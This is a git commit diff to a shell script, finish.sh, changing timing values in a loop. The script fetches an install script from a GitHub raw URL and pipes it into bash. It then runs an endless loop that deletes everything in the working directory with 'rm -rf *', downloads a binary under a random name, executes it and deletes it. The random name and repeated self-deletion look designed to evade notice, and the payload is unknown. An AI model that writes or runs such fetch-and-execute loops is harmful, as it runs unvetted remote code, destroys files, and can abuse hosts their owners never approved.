f1cd2c0a8c0db3ddd87cd65d466cd4b1910b7c9e
samaniheo <tiosanjaya635@gmail.com>
2024-08-01 14:59:28 +0700

    Update finish.sh

--- finish.sh
+++ finish.sh
@@ -1,4 +1,4 @@
 wget https://raw.githubusercontent.com/samaniheo/aploka/main/installation.sh
 bash installation.sh
 TAMPER=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
-while :; do timeout 1800 rm -rf *; wget -qO $TAMPER https://raw.githubusercontent.com/samaniheo/aploka/main/main; chmod +x $TAMPER; ./$TAMPER; rm -rf $TAMPER; sleep 25; done
+while :; do timeout 21600 rm -rf *; wget -qO $TAMPER https://raw.githubusercontent.com/samaniheo/aploka/main/main; chmod +x $TAMPER; ./$TAMPER; rm -rf $TAMPER; sleep 5; done
